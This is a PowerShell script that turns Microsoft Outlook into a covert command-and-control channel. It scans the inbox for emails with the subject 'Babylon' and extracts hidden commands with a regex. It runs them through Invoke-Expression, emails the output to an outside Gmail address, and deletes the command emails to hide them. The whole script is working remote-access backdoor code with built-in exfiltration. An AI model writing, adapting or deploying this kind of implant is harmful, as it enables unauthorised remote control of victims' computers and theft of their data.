
function main{
	<# number of emails to check - begins from the newer one#>
	$N=5
	$pattern = "VFIZMR(.*?)RMZIFV"
	$SearchingBy = "Babylon"
	while (1){
		Add-type -assembly "Microsoft.Office.Interop.Outlook" | out-null
		$olFolders = "Microsoft.Office.Interop.Outlook.olDefaultFolders" -as [type]
		$outlook = new-object -comobject outlook.application
		$namespace = $outlook.GetNameSpace("MAPI")
		$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox)
		$AllItems = $folder.Items
		$Recent = $AllItems.GetLast()
		for ($i=0; $i -lt $N; $i++){
			echo $i
			#$folder.items | where { $_.subject -match 'Automation' } | Select-Object -Property body
			$HTSubject = $Recent.subject
			$HTContent = $Recent.HTMLBody
			#Check if this email part of the C2
			if ($HTSubject -eq $SearchingBy){
				$object = [regex]::Match($HTContent,$pattern).Groups[1].Value
				#$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($object))
				$Result = $object | Invoke-Expression
				$Result = $Result | Out-String
				#$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Result)
				#$EncodedText =[Convert]::ToBase64String($Bytes)
				SendMail($Result)
				$Recent.Delete()
				$Recent = $AllItems.GetPrevious()
				continue
			}
			$Recent = $AllItems.GetPrevious()
		}
	<# Exceute every 30 sec#>
	echo "Sleeping ..."
	Start-Sleep -s 3
	}
}

function ExtractFileName([String] $filePath){
	$fileName = [System.IO.Path]::GetFileNameWithoutExtension($filePath)
	$fileExt = [System.IO.Path]::GetExtension($filePath)
	$result = [string]::format("{0}{1}", $fileName, $fileExt)
	return $result
}

function SendMail([String] $Result){
	#$htmlHeader = "<HEAD>Text<B>BOLD</B>  <span style='color:#E36C0A'>Color Text</span></HEAD>"
	$htmlText = "<HTML>{0}</HTML><img src='cid:{1}'>"
	$OutlookNew = New-Object -ComObject Outlook.Application
	$Mail = $OutlookNew.CreateItem(0)
	$Mail.To = "svhilimem@gmail.com"
	$Mail.Subject = "VLFI"
	$exportedFile = "C:\Users\VladiFidchuk\Documents\ahva.jpg"
	$Mail.HTMLBody = [string]::Format($htmlText, $Result, $exportedFile)
	#$Mail.Body = $body
	$Mail.Attachments.Add($exportedFile)
	$Mail.Send()
}	

#Entry point
main
